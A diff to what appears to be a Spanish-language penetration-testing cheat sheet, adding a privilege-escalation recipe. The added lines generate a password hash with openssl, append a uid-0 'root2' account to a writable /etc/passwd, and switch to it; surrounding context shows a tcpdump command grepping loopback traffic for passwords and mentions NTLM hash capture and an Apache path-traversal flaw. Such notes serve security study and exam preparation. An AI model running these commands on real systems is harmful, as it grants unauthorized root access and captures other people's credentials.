@@ -327,6 +327,14 @@ Obtener hash NTLM desde un formulario de carga de archivos:
 
     sudo tcpdump -i lo -A | grep "pass"
 
+  Fichero '/etc/passwd' con permisos de escritura con nuestro usuario actual. Generamos nueva contraseña y la hasheamos con openssl, la añadimos a /etc/passwd en la linea de root2 y accedemos con ese usuario:
+
+    openssl passwd w00t
+    echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+    su root2
+    w00t
+    id
+
 ## Vulnerabilidades conocidas
 
 Apache HTTP Server 2.4.49 - Path traversal
